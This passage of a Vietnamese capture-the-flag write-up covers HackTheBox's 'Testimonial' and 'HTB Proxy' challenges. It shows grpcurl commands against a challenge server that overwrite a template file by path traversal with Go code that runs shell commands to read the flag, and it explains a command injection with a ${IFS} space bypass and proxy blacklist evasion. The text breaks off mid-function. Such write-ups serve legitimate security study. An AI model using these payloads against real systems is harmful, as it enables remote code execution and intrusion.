+            &lt;li class=&quot;nav-item&quot;&gt;
+                &lt;a class=&quot;nav-link&quot; href=&quot;javascript:void();&quot;&gt;Contact&lt;/a&gt;
+            &lt;/li&gt;
+        &lt;/ul&gt;
+    &lt;/div&gt;
+  &lt;/div&gt;
+&lt;/nav&gt;
+
+&lt;div class=&quot;container&quot;&gt;
+  &lt;section class=&quot;jumbotron text-center&quot;&gt;
+      &lt;div class=&quot;container mt-5&quot;&gt;
+          &lt;h1 class=&quot;display-4&quot;&gt;Welcome to The Fray&lt;/h1&gt;
+          &lt;p class=&quot;lead&quot;&gt;Assemble your faction and prove you're the last one standing!&lt;/p&gt;
+          &lt;a href=&quot;javascript:void();&quot; class=&quot;btn btn-primary btn-lg&quot;&gt;Get Started&lt;/a&gt;
+      &lt;/div&gt;
+  &lt;/section&gt;
+
+  &lt;section class=&quot;container mt-5&quot;&gt;
+      &lt;h2 class=&quot;text-center mb-4&quot;&gt;What Others Say&lt;/h2&gt;
+      &lt;div class=&quot;row&quot;&gt;
+          @Testimonials()
+      &lt;/div&gt;
+  &lt;/section&gt;
+
+
+  &lt;div class=&quot;row mt-5 mb-5&quot;&gt;
+    &lt;div class=&quot;col-md&quot;&gt;
+      &lt;h2 class=&quot;text-center mb-4&quot;&gt;Submit Your Testimonial&lt;/h2&gt;
+      &lt;form method=&quot;get&quot; action=&quot;/&quot;&gt;
+        &lt;div class=&quot;form-group&quot;&gt;
+          &lt;label class=&quot;mt-2&quot; for=&quot;testimonialText&quot;&gt;Your Testimonial&lt;/label&gt;
+          &lt;textarea class=&quot;form-control mt-2&quot; id=&quot;testimonialText&quot; rows=&quot;3&quot; name=&quot;testimonial&quot;&gt;&lt;/textarea&gt;
+        &lt;/div&gt;
+        &lt;div class=&quot;form-group&quot;&gt;
+          &lt;label class=&quot;mt-2&quot; for=&quot;testifierName&quot;&gt;Your Name&lt;/label&gt;
+          &lt;input type=&quot;text&quot; class=&quot;form-control mt-2&quot; id=&quot;testifierName&quot; name=&quot;customer&quot;/&gt;
+        &lt;/div&gt;
+        &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary mt-4&quot;&gt;Submit Testimonial&lt;/button&gt;
+      &lt;/form&gt;
+    &lt;/div&gt;
+  &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;footer class=&quot;bg-black text-white text-center py-3&quot;&gt;
+    &lt;p&gt;&amp;copy; 2024 The Fray. All Rights Reserved.&lt;/p&gt;
+&lt;/footer&gt;
+	}
+}
+
+func GetTestimonials() []string {
+	fsys := os.DirFS(&quot;public/testimonials&quot;)	
+	files, err := fs.ReadDir(fsys, &quot;.&quot;)		
+	if err != nil {
+		return []string{fmt.Sprintf(&quot;Error reading testimonials: %v&quot;, err)}
+	}
+	var res []string
+	for _, file := range files {
+		fileContent, _ := fs.ReadFile(fsys, file.Name())
+		res = append(res, string(fileContent))		
+	}
+	return res
+}
+
+templ Testimonials() {
+  for _, item := range GetTestimonials() {
+    &lt;div class=&quot;col-md-4&quot;&gt;
+        &lt;div class=&quot;card mb-4&quot;&gt;
+            &lt;div class=&quot;card-body&quot;&gt;
+                &lt;p class=&quot;card-text&quot;&gt;&quot;{item}&quot;&lt;/p&gt;
+                &lt;p class=&quot;text-muted&quot;&gt;- Anonymous Testifier&lt;/p&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+  }
+}
+</code></pre><ul>
+<li>Ta có thể thấy ở đây thì trang sẽ hiển thị các bản note theo định dạng string hết nên khó có thể xss hoặc ssti ở đây:</li>
+</ul>
+<pre><code>func GetTestimonials() []string {
+	fsys := os.DirFS(&quot;public/testimonials&quot;)	
+	files, err := fs.ReadDir(fsys, &quot;.&quot;)		
+	if err != nil {
+		return []string{fmt.Sprintf(&quot;Error reading testimonials: %v&quot;, err)}
+	}
+	var res []string
+	for _, file := range files {
+		fileContent, _ := fs.ReadFile(fsys, file.Name())
+		res = append(res, string(fileContent))		
+	}
+	return res
+}
+
+</code></pre><ul>
+<li>Cùng để ý vị trí của flag:</li>
+</ul>
+<pre><code>
+FROM golang:1.22-alpine3.18
+
+WORKDIR /challenge/
+
+COPY ./challenge/ /challenge/
+
+COPY ./flag.txt /flag.txt
+
+RUN go mod download -x \
+ &amp;&amp; go install github.com/cosmtrek/air@latest \
+ &amp;&amp; go install github.com/a-h/templ/cmd/templ@latest
+
+EXPOSE 1337
+EXPOSE 50045
+
+COPY --chown=root entrypoint.sh /entrypoint.sh
+RUN chmod +x /entrypoint.sh
+ENTRYPOINT [&quot;/entrypoint.sh&quot;]
+
+</code></pre><ul>
+<li>
+<p>Flag nằm tại root nên mục tiêu của ta là RCE được mà khả năng của SSTI với template này hầu như là không được.</p>
+</li>
+<li>
+<p>Như mình đã phần tích thì bạn để ý việc filter do bạn gửi 2 query trên đến server và tcp này có vai trò như một proxy có nghĩa là nó chỉ filter trước khi chúng ta gửi đến nó -&gt; vậy ta có thể kết nối trực tiếp đến tcp luôn không -&gt; câu trả lời là có -&gt; nếu ta gửi trực tiếp đến tcp port lúc này nó không bị filter các kí tự blacklist.</p>
+</li>
+<li>
+<p>vậy là ý tưởng để bypass blacklist đã có, vậy thì làm sao để RCE -&gt; ta sẽ đi vào sâu vào luồng mà 2 giá trị ta truyền vào là gì.</p>
+</li>
+<li>
+<p>và nó ở đây:</p>
+</li>
+</ul>
+<pre><code>func (s *server) SubmitTestimonial(ctx context.Context, req *pb.TestimonialSubmission) (*pb.GenericReply, error) {
+	if req.Customer == &quot;&quot; {
+		return nil, errors.New(&quot;Name is required&quot;)
+	}
+	if req.Testimonial == &quot;&quot; {
+		return nil, errors.New(&quot;Content is required&quot;)
+	}
+
+	err := os.WriteFile(fmt.Sprintf(&quot;public/testimonials/%s&quot;, req.Customer), []byte(req.Testimonial), 0644)
+	if err != nil {
+		return nil, err
+	}
+
+	return &amp;pb.GenericReply{Message: &quot;Testimonial submitted successfully&quot;}, nil
+}
+
+</code></pre><ul>
+<li>ở đây thì sẽ gọi os viết file <code>os.WriteFile(fmt.Sprintf(&quot;public/testimonials/%s&quot;, req.Customer), []byte(req.Testimonial)</code></li>
+<li>Vậy do filter &lsquo;.&rsquo; nên chúng ta không thể triger path travesal để ghi đè file được.</li>
+<li>ở đây ta có thể dùng postman hoặc grpcurl của golang để gửi request trực tiếp đến grpc.</li>
+</ul>
+<h3 id="rce">RCE</h3>
+<ul>
+<li>Đầu tiên ta dùng grpcurl để gửi request -&gt; ghi đề file index.templ</li>
+<li>Sau đó ta triger code để đọc flag</li>
+</ul>
+<h3 id="exploit-2">Exploit</h3>
+<p><img src="https://hackmd.io/_uploads/SksPoTiIC.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/ByTui6jIC.png" alt="image"></p>
+<pre><code>
+l3mnt2010@ASUSEXPERTBOOK:~/tools/Tesmitional$ grpcurl -import-path challenge/pb/ -proto ptypes.proto 94.237.59.63:31364 list
+RickyService
+l3mnt2010@ASUSEXPERTBOOK:~/tools/Tesmitional$
+
+</code></pre><ul>
+<li>
+<p>Có thể thấy ở đây đang có một service RickyService như ta thấy đó là chạy tcp với grpc.</p>
+</li>
+<li>
+<p>Ta sẽ xem mô tả của service này :</p>
+</li>
+</ul>
+<pre><code>l3mnt2010@ASUSEXPERTBOOK:~/tools/Tesmitional$ grpcurl -import-path challenge/pb/ -proto ptypes.proto 94.237.59.63:31364 list
+RickyService
+l3mnt2010@ASUSEXPERTBOOK:~/tools/Tesmitional$ grpcurl -import-path challenge/pb/ -proto ptypes.proto 94.237.59.63:31364 describe RickyService
+RickyService is a service:
+service RickyService {
+  rpc SubmitTestimonial ( .TestimonialSubmission ) returns ( .GenericReply );
+}
+l3mnt2010@ASUSEXPERTBOOK:~/tools/Tesmitional$
+
+</code></pre><ul>
+<li>Bây giờ ta sẽ gửi request đến nó:</li>
+</ul>
+<pre><code>l3mnt2010@ASUSEXPERTBOOK:~/tools/Tesmitional$ grpcurl -import-path challenge/pb/ -proto ptypes.proto 94.237.59.63:31364 list
+RickyService
+l3mnt2010@ASUSEXPERTBOOK:~/tools/Tesmitional$ grpcurl -import-path challenge/pb/ -proto ptypes.proto 94.237.59.63:31364 describe RickyService
+RickyService is a service:
+service RickyService {
+  rpc SubmitTestimonial ( .TestimonialSubmission ) returns ( .GenericReply );
+}
+l3mnt2010@ASUSEXPERTBOOK:~/tools/Tesmitional$ grpcurl -import-path challenge/pb/ -proto ptypes.proto 94.237.59.63:31364
+RickyService.SubmitTestimonial
+Failed to dial target host &quot;94.237.59.63:31364&quot;: tls: first record does not look like a TLS handshake
+l3mnt2010@ASUSEXPERTBOOK:~/tools/Tesmitional$ grpcurl -plaintext -d '{&quot;customer&quot;: &quot;test&quot;, &quot;testimonial&quot;: &quot;test&quot;}' -import-path challenge/pb/ -proto ptypes.proto 94.237.59.63:31364 RickyService.SubmitTestimonial
+{
+  &quot;message&quot;: &quot;Testimonial submitted successfully&quot;
+}
+l3mnt2010@ASUSEXPERTBOOK:~/tools/Tesmitional$
+
+</code></pre><ul>
+<li>Nó đã hiển thị ở trong nội dung:</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/HJhcppoI0.png" alt="image"></p>
+<ul>
+<li>Vậy ta có thể trigger được rồi -&gt; bây giờ thì ghi đè index.templ:</li>
+</ul>
+<p>Nội dung:</p>
+<pre><code>package home
+
+import (
+    &quot;os/exec&quot;
+    &quot;strings&quot;
+)
+
+func hack() []string {
+    output, _ := exec.Command(&quot;ls&quot;, &quot;/&quot;).CombinedOutput()
+    lines := strings.Fields(string(output))
+    return lines
+}
+
+templ Index() {
+    @template(hack())
+}
+
+templ template(items []string) {
+    for _, item := range items {
+        {item}
+    }
+}
+</code></pre><pre><code>l3mnt2010@ASUSEXPERTBOOK:~/tools/Tesmitional$ grpcurl -import-path challenge/pb/ -proto ptypes.proto 94.237.59.63:31364 list
+RickyService
+l3mnt2010@ASUSEXPERTBOOK:~/tools/Tesmitional$ grpcurl -import-path challenge/pb/ -proto ptypes.proto 94.237.59.63:31364 describe RickyService
+RickyService is a service:
+service RickyService {
+  rpc SubmitTestimonial ( .TestimonialSubmission ) returns ( .GenericReply );
+}
+l3mnt2010@ASUSEXPERTBOOK:~/tools/Tesmitional$ grpcurl -import-path challenge/pb/ -proto ptypes.proto 94.237.59.63:31364
+RickyService.SubmitTestimonial
+Failed to dial target host &quot;94.237.59.63:31364&quot;: tls: first record does not look like a TLS handshake
+l3mnt2010@ASUSEXPERTBOOK:~/tools/Tesmitional$ grpcurl -plaintext -d '{&quot;customer&quot;: &quot;test&quot;, &quot;testimonial&quot;: &quot;test&quot;}' -import-path challenge/pb/ -proto ptypes.proto 94.237.59.63:31364 RickyService.SubmitTestimonial
+{
+  &quot;message&quot;: &quot;Testimonial submitted successfully&quot;
+}
+l3mnt2010@ASUSEXPERTBOOK:~/tools/Tesmitional$ grpcurl -plaintext -d '{&quot;customer&quot;: &quot;../../view/home/index.templ&quot;, &quot;testimonial&quot;: &quot;package home\n\nimport (\n\t\&quot;os/exec\&quot;\n\t\&quot;strings\&quot;\n)\n\nfunc hack() []string {\n\toutput, _ := exec.Command(\&quot;ls\&quot;, \&quot;/\&quot;).CombinedOutput()\n\tlines := strings.Fields(string(output))\n\treturn lines\n}\n\ntempl Index() {\n\t@template(hack())\n}\n\ntempl template(items []string) {\n\tfor _, item := range items {\n\t\t{item}\n\t}\n}&quot; }' -import-path challenge/pb/ -proto ptypes.proto 94.237.59.63:31364 RickyService.SubmitTestimonial
+{
+  &quot;message&quot;: &quot;Testimonial submitted successfully&quot;
+}
+l3mnt2010@ASUSEXPERTBOOK:~/tools/Tesmitional$
+</code></pre><p><img src="https://hackmd.io/_uploads/rkVGJCs80.png" alt="image"></p>
+<pre><code>l3mnt2010@ASUSEXPERTBOOK:~/tools/Tesmitional$ grpcurl -plaintext -d '{&quot;customer&quot;: &quot;../../view/home/index.templ&quot;, &quot;testimonial&quot;: &quot;package home\n\nimport (\n\t\&quot;os/exec\&quot;\n\t\&quot;strings\&quot;\n)\n\nfunc hack() []string {\n\toutput, _ := exec.Command(\&quot;cat\&quot;, \&quot;/flagd9d82e7fe1.txt\&quot;).CombinedOutput()\n\tlines := strings.Fields(string(output))\n\treturn lines\n}\n\ntempl Index() {\n\t@template(hack())\n}\n\ntempl template(items []string) {\n\tfor _, item := range items {\n\t\t{item}\n\t}\n}&quot; }' -import-path challenge/pb/ -proto ptypes.proto 94.237.59.63:31364 RickyService.SubmitTestimonial
+{
+  &quot;message&quot;: &quot;Testimonial submitted successfully&quot;
+}
+l3mnt2010@ASUSEXPERTBOOK:~/tools/Tesmitional$
+</code></pre><p><img src="https://hackmd.io/_uploads/HyywyAi8A.png" alt="image"></p>
+<p>flag: <code>HTB{w34kly_t35t3d_t3mplate5_n0t_s4f3_4t_411}</code></p>
+<h2 id="htb-proxy">HTB Proxy</h2>
+<ul>
+<li>
+<p>Một chall với proxy golang do author tự config + backend chạy với nodejs.</p>
+</li>
+<li>
+<p>Ta sẽ đi từ backend đi ngược lại:</p>
+</li>
+</ul>
+<pre><code>const ipWrapper = require(&quot;ip-wrapper&quot;);
+const express = require(&quot;express&quot;);
+
+const app = express();
+app.use(express.json());
+
+const validateInput = (req, res, next) =&gt; {
+    const { interface } = req.body;
+
+    if (
+        !interface || 
+        typeof interface !== &quot;string&quot; || 
+        interface.trim() === &quot;&quot; || 
+        interface.includes(&quot; &quot;)
+    ) {
+        return res.status(400).json({message: &quot;A valid interface is required&quot;});
+    }
+
+    next();
+}
+
+app.post(&quot;/getAddresses&quot;, async (req, res) =&gt; {
+    try {
+        const addr = await ipWrapper.addr.show();
+        res.json(addr);
+    } catch (err) {
+        res.status(401).json({message: &quot;Error getting addresses&quot;});
+    }
+});
+
+app.post(&quot;/flushInterface&quot;, validateInput, async (req, res) =&gt; {
+    const { interface } = req.body;
+
+    try {
+        const addr = await ipWrapper.addr.flush(interface);
+        res.json(addr);
+    } catch (err) {
+        res.status(401).json({message: &quot;Error flushing interface&quot;});
+    }
+});
+
+app.listen(5000, () =&gt; {
+    console.log(&quot;Network utils API is up on :5000&quot;);
+});
+</code></pre><ul>
+<li>Source code đơn giản như này, có thể thấy có 2 route duy nhất đó là /getAddresses và /flushInterface.</li>
+<li>Đi vào xem source của <code>ip-wrapper</code> có thể thấy ở api <code>flushInterface</code> ở method flush sẽ gọi một command với exec của <code>child_process</code>:</li>
+</ul>
+<pre><code>function flush(interfaceName) {
+    return new Promise((resolve, reject) =&gt; {
+        exec(`ip address flush dev ${interfaceName}`, (error, stdout, stderr) =&gt; {
+            if (stderr) {
+                if(stderr.includes('Cannot find device')) {
+                    reject(new Error('Cannot find device ' + interfaceName));
+                } else {
+                    reject(new Error('Error flushing IP addresses: ' + stderr));
+                }
+                return;
+            }
+
+            resolve();
+        });
+    });
+}
+</code></pre><p>Nó nhận interfaceName và nối chuỗi vào command -&gt; ta có thể thực hiện command injection ở đây. Và <code>const { interface } = req.body;</code> có thể được control bởi đầu vào của người dùng -&gt; RCE ở đây:</p>
+<pre><code># Start from the base Alpine image
+FROM alpine:3.19.1
+
+# Install Golang, Node.js, and Supervisor
+RUN apk add --no-cache \
+    go \
+    nodejs \
+    npm \
+    supervisor \
+    &amp;&amp; npm install -g npm@latest
+
+# Copy flag
+COPY flag.txt /flag.txt
+
+# Set a working directory 
+WORKDIR /app/proxy
+
+COPY challenge /app
+
+# Compile proxy
+RUN go build -o htbproxy main.go
+
+# Set workdir
+WORKDIR /app/backend
+
+# Install npm dependencies
+RUN npm install
+
+# Setup supervisor
+COPY config/supervisord.conf /etc/supervisord.conf
+
+# Expose port the server is reachable on
+EXPOSE 1337
+
+# Create database and start supervisord
+COPY --chown=root entrypoint.sh /entrypoint.sh
+RUN chmod +x /entrypoint.sh
+ENTRYPOINT [&quot;/entrypoint.sh&quot;]
+</code></pre><ul>
+<li>Flag nằm ở root nên đây là hướng đi của chall này -&gt; nhưng trước hết ta cần để ý là để access đến nó có một middleware:</li>
+</ul>
+<pre><code>const validateInput = (req, res, next) =&gt; {
+    const { interface } = req.body;
+
+    if (
+        !interface || 
+        typeof interface !== &quot;string&quot; || 
+        interface.trim() === &quot;&quot; || 
+        interface.includes(&quot; &quot;)
+    ) {
+        return res.status(400).json({message: &quot;A valid interface is required&quot;});
+    }
+
+    next();
+}
+</code></pre><ul>
+<li>Check interface là chuỗi không chứa khoảng trắng hoặc nếu loại bỏ khoảng trắng nó rỗng -&gt; đây là cách filter commannd injection -&gt; ta có một cách bypass space là ${IFS}. Vậy là đã có cách để bypass commandi -&gt; vấn đề tiếp theo là proxy golang.</li>
+</ul>
+<h3 id="go-proxy">Go proxy</h3>
+<pre><code>func main() {
+	var serverPort string = &quot;1337&quot;
+	var version string = &quot;1.0.0&quot;
+	logHeader(version)
+
+	ln, err := net.Listen(&quot;tcp&quot;, &quot;:&quot;+serverPort)
+	if err != nil {
+		prettyLog(2, &quot;Error listening: &quot;+err.Error())
+		return
+	}
+
+	defer ln.Close()
+	prettyLog(1, &quot;HTB proxy listening on :&quot;+serverPort)
+
+	for {
+		conn, err := ln.Accept()
+		if err != nil {
+			prettyLog(2, &quot;Error accepting: &quot;+err.Error())
+			continue
+		}
+
+		go handleRequest(conn)
+	}
+}
+</code></pre><ul>
+<li>Ta có thể thấy ở đây là chương trình chạy tcp ở cổng 1337 và hanndler các request với :</li>
+</ul>
+<pre><code>go handleRequest(conn)
+</code></pre><pre><code>func handleRequest(frontendConn net.Conn) {
+	buffer := make([]byte, 1024)
+
+	length, err := frontendConn.Read(buffer)
+	var remoteAddr string = frontendConn.RemoteAddr().String()
+
+	prettyLog(1, &quot;Connection from: &quot;+remoteAddr)
+
+	if err != nil {
+		prettyLog(2, &quot;Error reading: &quot;+err.Error())
+		frontendConn.Close()
+		return
+	}
+
+	var requestBytes = buffer[:length]
+	request, err := requestParser(requestBytes, remoteAddr)
+
+	if err != nil {
+		var responseText string = badReqResponse(err.Error())
+		frontendConn.Write([]byte(responseText))
+		frontendConn.Close()
+		return
+	}
+
+	if request.Protocol != HTTPVersions.HTTP1_1 {
+		var responseText string = notSupportedResponse(&quot;Protocol version not supported&quot;)
+		frontendConn.Write([]byte(responseText))
+		frontendConn.Close()
+		return
+	}
+
+	if request.URL == string([]byte{47}) {
+		var responseText string = htmlResponse(&quot;/app/proxy/includes/index.html&quot;)
+		frontendConn.Write([]byte(responseText))
+		frontendConn.Close()
+		return
+	}
+
+	if request.URL == string([]byte{47, 115, 101, 114, 118, 101, 114, 45, 115, 116, 97, 116, 117, 115}) {
+		var serverInfo string = GetServerInfo()
+		var responseText string = okResponse(serverInfo)
+		frontendConn.Write([]byte(responseText))
+		frontendConn.Close()
+		return
+	}
+
+	if strings.Contains(strings.ToLower(request.URL), string([]byte{102, 108, 117, 115, 104, 105, 110, 116, 101, 114, 102, 97, 99, 101})) {
+		var responseText string = badReqResponse(&quot;Not Allowed&quot;)
+		frontendConn.Write([]byte(responseText))
+		frontendConn.Close()
+		return
+	}
+
+	host, hostExists := request.Headers[&quot;Host&quot;]
+	if !hostExists {
+		var responseText string = badReqResponse(&quot;Host header not set&quot;)
+		frontendConn.Write([]byte(responseText))
+		frontendConn.Close()
+		return
+	}
+
+	var hostArray []string = strings.Split(host, &quot;:&quot;)
+	if len(hostArray) != 2 || hostArray[1] == &quot;&quot; {
+		var responseText string = badReqResponse(&quot;Invalid host&quot;)
+		frontendConn.Write([]byte(responseText))
+		frontendConn.Close()
+		return
+	}
+
+	var hostPort string = hostArray[1]
+	inRange, err := isDigitInRange(hostPort, 1, 65535)
+	if err != nil || !inRange {
+		var responseText string = badReqResponse(&quot;Invalid port&quot;)
+		frontendConn.Write([]byte(responseText))
+		frontendConn.Close()
+		return
+	}
+
+	var hostAddress string = hostArray[0]
+	var isIPv4Addr bool = isIPv4(hostAddress)
+	var isDomainAddr bool = isDomain(hostAddress)
+
+	if !isIPv4Addr &amp;&amp; !isDomainAddr {
+		var responseText string = badReqResponse(&quot;Invalid host&quot;)
+		frontendConn.Write([]byte(responseText))
+		frontendConn.Close()
+		return
+	}
+
+	isLocal, err := checkIfLocalhost(hostAddress)
+	if err != nil {
+		var responseText string = errorResponse(&quot;Invalid host&quot;)
+		frontendConn.Write([]byte(responseText))
+		frontendConn.Close()
+		return
+	}
+
+	if isLocal {
+		var responseText string = movedPermResponse(&quot;/&quot;)
+		frontendConn.Write([]byte(responseText))
+		frontendConn.Close()
+		return
+	}
+
+	isMalicious, err := checkMaliciousBody(request.Body)
+	if err != nil || isMalicious {
+		var responseText string = badReqResponse(&quot;Malicious request detected&quot;)
+		prettyLog(1, &quot;Malicious request detected&quot;)
+		frontendConn.Write([]byte(responseText))
+		frontendConn.Close()
+		return
+	}
+
+	backendConn, err := net.Dial(&quot;tcp&quot;, host)
+	if err != nil {
+		var responseText string = errorResponse(&quot;Could not connect to backend server&quot;)
+		frontendConn.Write([]byte(responseText))
+		frontendConn.Close()
+		return
+	}
+
+	_, err = backendConn.Write(requestBytes)
+	if err != nil {
+		var responseText string = errorResponse(&quot;Error sending request to backend&quot;)
+		frontendConn.Write([]byte(responseText))
+		frontendConn.Close()
+		backendConn.Close()
+		return
+	}
+
+	var backendResponse strings.Builder
+	var scanner *bufio.Scanner = bufio.NewScanner(backendConn)
+
+	for scanner.Scan() {
+		var line string = scanner.Text()
+		backendResponse.WriteString(line + &quot;\n&quot;)
+	}
+
+	if err := scanner.Err(); err != nil {
+		var responseText string = errorResponse(&quot;Error reading backend response&quot;)
+		frontendConn.Write([]byte(responseText))
+		frontendConn.Close()
+		backendConn.Close()
+		return
+	}
+
+	prettyLog(1, &quot;Forwarding request to: &quot;+host)
+	var responseStr string = backendResponse.String()
+	frontendConn.Write([]byte(responseStr))
+	frontendConn.Close()
+	backendConn.Close()
+}
+</code></pre><ul>
+<li>
+<p>Lấy độ dài <code>length, err := frontendConn.Read(buffer)</code>.</p>
+</li>
+<li>
+<p>Lấy <code>remoteAddr</code> : <code>frontendConn.RemoteAddr().String()</code></p>
+</li>
+<li>
+<p>Sau đó sẽ gọi hàm <code>request, err := requestParser(requestBytes, remoteAddr)</code> với 2 tham số trên:</p>
+</li>
+</ul>
+<pre><code>func requestParser(requestBytes []byte, remoteAddr string) (*HTTPRequest, error) {
+	var requestLines []string = strings.Split(string(requestBytes), &quot;\r\n&quot;)
+	var bodySplit []string = strings.Split(string(requestBytes), &quot;\r\n\r\n&quot;)
+
+	if len(requestLines) &lt; 1 {
+		return nil, fmt.Errorf(&quot;invalid request format&quot;)
+	}
+
+	var requestLine []string = strings.Fields(requestLines[0])
+	if len(requestLine) != 3 {
+		return nil, fmt.Errorf(&quot;invalid request line&quot;)
+	}
+
+	var request *HTTPRequest = &amp;HTTPRequest{
+		RemoteAddr: remoteAddr,
+		Method:     requestLine[0],
+		URL:        requestLine[1],
+		Protocol:   requestLine[2],
+		Headers:    make(map[string]string),
+	}
+
+	for _, line := range requestLines[1:] {
+		if line == &quot;&quot; {
+			break
+		}
+
+		headerParts := strings.SplitN(line, &quot;: &quot;, 2)
+		if len(headerParts) != 2 {
+			continue
+		}
+
+		request.Headers[headerParts[0]] = headerParts[1]
+	}
+
+	if request.Method == HTTPMethods.POST {
+		contentLength, contentLengthExists := request.Headers[&quot;Content-Length&quot;]
+		if !contentLengthExists {
+			return nil, fmt.Errorf(&quot;unknown content length for body&quot;)
+		}
+
+		contentLengthInt, err := strconv.Atoi(contentLength)
+		if err != nil {
+			return nil, fmt.Errorf(&quot;invalid content length&quot;)
+		}
+
+		if len(bodySplit) &lt;= 1 {
+			return nil, fmt.Errorf(&quot;invalid content length&quot;)
+		}
+
+		var bodyContent string = bodySplit[1]
+		if len(bodyContent) != contentLengthInt {
+			return nil, fmt.Errorf(&quot;invalid content length&quot;)
+		}
+
+		request.Body = bodyContent[0:contentLengthInt]
+		return request, nil
+	}
+
+	if len(bodySplit) &gt; 1 &amp;&amp; bodySplit[1] != &quot;&quot; {
+		return nil, fmt.Errorf(&quot;can't include body for non-POST requests&quot;)
+	}
+
+	return request, nil
+}
+</code></pre><ul>
+<li>Đầu tiên sẽ thực hiện tách code thành các dòng từ <code>&quot;\r\n&quot;</code> và gán vào trong mảng <code>var requestLines []string = strings.Split(string(requestBytes), &quot;\r\n&quot;)</code></li>
+<li>Sau đó thực hiện tách phần body và header:</li>
+</ul>
+<pre><code>var bodySplit []string = strings.Split(string(requestBytes), &quot;\r\n\r\n&quot;)
+</code></pre><ul>
+<li>Yêu cầu requestLines phải có 1 phần tử trở lên -&gt; lấy dòng đầu tiên của yêu cầu http:</li>
+</ul>
+<pre><code>var requestLine []string = strings.Fields(requestLines[0])
+</code></pre><ul>
+<li>Yêu cầu mảng này phải có đúng 3 phần tử -&gt; tạo một biến request theo struct <code>HTTPRequest</code>:</li>
+</ul>
+<pre><code>var request *HTTPRequest = &amp;HTTPRequest{
+		RemoteAddr: remoteAddr,
+		Method:     requestLine[0],
+		URL:        requestLine[1],
+		Protocol:   requestLine[2],
+		Headers:    make(map[string]string),
+	}
+</code></pre><ul>
+<li>Tiếp theo nó sẽ thực hiện duyệt vòng for từ phần tử thứ 2 của <code>requestLines</code> là các dòng được tách từ yêu cầu http.</li>
+<li>Nếu headerParts := strings.SplitN(line, &ldquo;: &ldquo;, 2) tách làm 2 phần và nếu độ dài nó khác 2 thì sẽ bỏ qua vòng lặp với dòng này.</li>
+<li>Nếu bằng 2 thì :</li>
+</ul>
+<p>request.Headers[headerParts[0]] = headerParts[1] gán header lần lượt vào.</p>
+<ul>
+<li>
+<p>Tiếp theo nếu method là POST thì sẽ nhận <code>contentLength</code> -&gt; chuyển thành dạng int.</p>
+</li>
+<li>
+<p>Nếu length khi tách phần body và phần header &lt;=1 thì trả ra lỗi ngược lại -&gt; gán <code>request.Body = bodyContent[0:contentLengthInt]</code> sau đó trả ra request.</p>
+</li>
+<li>
+<p>Nếu <code>len(bodySplit) &gt; 1 &amp;&amp; bodySplit[1] != &quot;&quot;</code> thì trả ra lỗi.</p>
+</li>
+<li>
+<p>Cuối cùng hàm này sẽ trả về request -&gt; nếu <code>request.Protocol != HTTP/1.1</code> thì tiếp tục -&gt; check <code>kiểm tra xem URL của yêu cầu (request.URL) có bằng ký tự '/'</code> -&gt; nếu khác sẽ vượt qua.</p>
+</li>
+<li>
+<p>Tiếp tục check nếu <code>request.URL == string([]byte{47, 115, 101, 114, 118, 101, 114, 45, 115, 116, 97, 116, 117, 115})</code> nếu <code>/server-status</code> còn nếu khác thì vượt qua.</p>
+</li>
+<li>
+<p>Check <code>strings.Contains(strings.ToLower(request.URL), string([]byte{102, 108, 117, 115, 104, 105, 110, 116, 101, 114, 102, 97, 99, 101}))</code> nếu URL chứa <code>flushinterface</code> thì detect.</p>
+</li>
+<li>
+<p>Lấy host của request -&gt; cắt thành mảng qua dấu <code>:</code> -&gt; nếu mảng có khác 2 phần tử  và phần tử thứ 2 == &quot;&rdquo; thì detect invalid host -&gt; gán host vào <code>hostPort</code> nếu tồn tại -&gt; kiểm tra <code>inRange, err := isDigitInRange(hostPort, 1, 65535)</code>:</p>
+</li>
+</ul>
+<pre><code>func isDigitInRange(s string, min int, max int) (bool, error) {
+	num, err := strconv.Atoi(s)
+	if err != nil {
+		return false, err
+	}
+	return num &gt;= min &amp;&amp; num &lt;= max, nil
+}
+</code></pre><p>-&gt; chuyển port thành int -&gt; kiểm tra nó có nằm trong khoảng port phù hợp không -&gt; khởi tạo <code>var hostAddress string = hostArray[0]</code> -&gt; kiểm tra có phải ipv4 không:</p>
+<pre><code>func isIPv4(input string) bool {
+	if strings.Contains(input, string([]byte{48, 120})) {
+		return false
+	}
+	var ipv4Pattern string = `^(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$`
+	match, _ := regexp.MatchString(ipv4Pattern, input)
+	return match &amp;&amp; !blacklistCheck(input)
+}
+</code></pre><ul>
+<li>kiểm tra xem chuỗi input có chứa chuỗi &ldquo;\0x&rdquo; hay không -&gt; sử dụng biểu thức chính quy để kiểm tra xem chuỗi input có phù hợp với định dạng địa chỉ IPv4 hay không -&gt; kiểm tra xem ip có trong blacklist hay không :</li>
+</ul>
+<pre><code>func blacklistCheck(input string) bool {
+	var match bool = strings.Contains(input, string([]byte{108, 111, 99, 97, 108, 104, 111, 115, 116})) ||
+		strings.Contains(input, string([]byte{48, 46, 48, 46, 48, 46, 48})) ||
+		strings.Contains(input, string([]byte{49, 50, 55, 46})) ||
+		strings.Contains(input, string([]byte{49, 55, 50, 46})) ||
+		strings.Contains(input, string([]byte{49, 57, 50, 46})) ||
+		strings.Contains(input, string([]byte{49, 48, 46}))
+
+	return match
+}
+
+</code></pre><ul>
+<li>
+<p>Kiểm tra có nằm trong iploopback hay không <code>&quot;localhost&quot; &quot;0.0.0.0&quot; &quot;127.&quot; &quot;172.&quot; &quot;192.&quot; &quot;10.&quot;</code></p>
+</li>
+<li>
+<p>Kiểm tra tương tự với domain:</p>
+</li>
+</ul>
+<pre><code>func isDomain(input string) bool {
+	var domainPattern string = `^[a-zA-Z0-9-]+(\.[a-zA-Z0-9-]+)*(\.[a-zA-Z]{2,})$`
+	match, _ := regexp.MatchString(domainPattern, input)
+	return match &amp;&amp; !blacklistCheck(input)
+}
+</code></pre><ul>
+<li>Kiểm tra nếu nó không phải là localhost <code>isLocal, err := checkIfLocalhost(hostAddress)</code>:</li>
+</ul>
+<pre><code>func checkIfLocalhost(address string) (bool, error) {
